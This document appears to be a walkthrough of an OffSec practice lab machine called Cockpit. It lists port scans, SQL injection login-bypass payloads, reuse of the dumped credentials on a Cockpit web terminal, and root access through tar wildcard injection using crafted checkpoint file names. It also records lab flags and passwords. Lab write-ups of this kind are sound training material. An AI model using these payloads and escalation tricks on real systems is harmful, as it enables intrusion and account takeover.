# Cockpit

## Enumeration & scanning

- Find open ports 22, 80, and 9090

``` sh
# Default commands
sudo nmap -p- 192.168.130.10
sudo nmap -p 22,80,9090 -A 192.168.130.10     
sudo nmap -p 80,9090 --script="vuln" 192.168.130.10
nuclei -target 192.168.130.10 
```

### 80 (Apache HTTP)

- Apache httpd 2.4.41, static website.
- There exists a /login.php page, seems to be custom.
- Vulnerable to SQLi (MySQL) after some tries, has blocking in place.

``` sh
# Default commands
feroxbuster --url http://192.168.130.10 -x php
# SQLi check
'
```

### 9090 (Cockpit web service 198 - 220)

- Login page, no exploits to be found.
- No other signs of potential weaknesses.

``` sh
# Default commands
# Feroxbuster failed because all URLs returned 200
feroxbuster --url http://192.168.130.10:9090 -x php

# SQLi payloads
```


## Foothold & Exploitation

- SQLi seems to work on port 80 login page.
- After some tries, a somewhat random query seems to work. Seems broken? Password is just compared to wildcard in error message, but can't login with random username, so not sure why the 'AND' payload works: `%' AND password like '%%'`
- We are displayed two users with base64 encoded passwords:
    - `james:canttouchhhthiss@455152`
    - `cameron:thisscanttbetouchedd@455152`
- Try accounts on Cockpit (9090) login, only `james` works.
- Management page has a terminal
- We find local flag

``` sh
# SQLi payloads
'
# Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1

' OR '1'='1' --
' OR 1
' OR "" = "
# You have been blocked due to an illegal activity and this incident will be reported.
http://blaze.offsec/blocked.html

' AND '1'='1' -- -
# Login works, passwords shown
```

``` sh
# Local flag
james@blaze:~$ ls
local.txt
james@blaze:~$ cat local.txt
b6364cc293a82e774176d62e50d4fc62
```

## Privilege Escalation

- Check sudoers file, there is a specific `tar` command that `james` can run with `sudo`.
- Command contains wildcard, might be vulnerable.
- Craft malicious command using online sources.

``` sh
# Check sudoers file, find command that can be run as root
/usr/bin/tar -czvf /tmp/backup.tar.gz *
# Craft malicious command
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
id
# Get root flag
cd /root
ls
flag2.txt  proof.txt  snap
cat flag2.txt
RWFzdGVyRWdn
cat proof.txt
84fb8eb28b9ff1fa10abf352ee65b3f2
```

``` sh
# Other privilege escalation paths tried
cat .bashrc
cat .profile
cat /etc/passwd
cat /etc/crontab
env
sudo -l
find / -perm -u=s -type f 2>/dev/null
su root (using password cameron)
```


## References

- https://gtfobins.org/gtfobins/tar/#shell
- https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa


## Rabbit holes

- N/A
